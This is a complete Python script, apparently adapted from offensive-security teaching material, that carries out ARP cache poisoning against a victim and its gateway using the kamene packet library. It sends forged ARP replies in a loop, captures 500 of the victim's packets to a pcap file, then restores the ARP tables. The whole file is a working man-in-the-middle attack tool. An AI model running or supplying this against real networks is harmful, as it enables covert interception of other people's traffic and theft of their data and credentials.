import kamene.all as kam
import sys
import threading
import time

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target...")
    kam.send(kam.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    kam.send(kam.ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

def get_mac(ip_address):
    responses, unanswered = kam.srp(kam.Ether(dst="ff:ff:ff:ff:ff:ff") / kam.ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in responses:
        return r[kam.Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning

    poison_tgt = kam.ARP()
    poison_tgt.op = 2
    poison_tgt.psrc = gateway_ip
    poison_tgt.pdst = target_ip
    poison_tgt.hwdst = target_mac

    poison_gateway = kam.ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while poisoning:
        kam.send(poison_tgt)
        kam.send(poison_gateway)
        time.sleep(2)

    print("[*] ARP poison attack finished")
    return

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <victim_ip> <gateway_ip> <interface>")
        sys.exit(1)

    tgt_ip = sys.argv[1]
    tgt_gateway = sys.argv[2]
    interface = sys.argv[3]
    packet_count = 500
    poisoning = True

    # set out our interface
    kam.conf.iface = interface

    # turn off output
    kam.conf.verb = 0

    print(f"[*] Setting up {interface}")

    tgt_gateway_mac = get_mac(tgt_gateway)

    if tgt_gateway_mac is None:
        print("[!!!] Failed to get gateway MAC. Exiting.")
        sys.exit(0)
    else:
        print(f"[*] Gateway {tgt_gateway} is at {tgt_gateway_mac}")

    tgt_mac = get_mac(tgt_ip)

    if tgt_mac is None:
        print("[!!!] Failed to get target MAC. Exiting.")
        sys.exit(0)
    else:
        print(f"[*] Target {tgt_ip} is at {tgt_mac}")

    # start poison thread
    poison_thread = threading.Thread(target=poison_target, args=(tgt_gateway, tgt_gateway_mac, tgt_ip, tgt_mac))
    poison_thread.start()

    try:
        print(f"[*] Starting sniffer for {packet_count} packets")
        bpf_filter = f"ip host {tgt_ip}"
        packets = kam.sniff(count=packet_count, filter=bpf_filter, iface=interface)
        print(f"[*] Writing packets to arper.pcap")
        kam.wrpcap("arper.pcap", packets)
    except KeyboardInterrupt:
        pass
    finally:
        poisoning = False
        time.sleep(2)
        # restore the network
        restore_target(tgt_gateway, tgt_gateway_mac, tgt_ip, tgt_mac)

    sys.exit()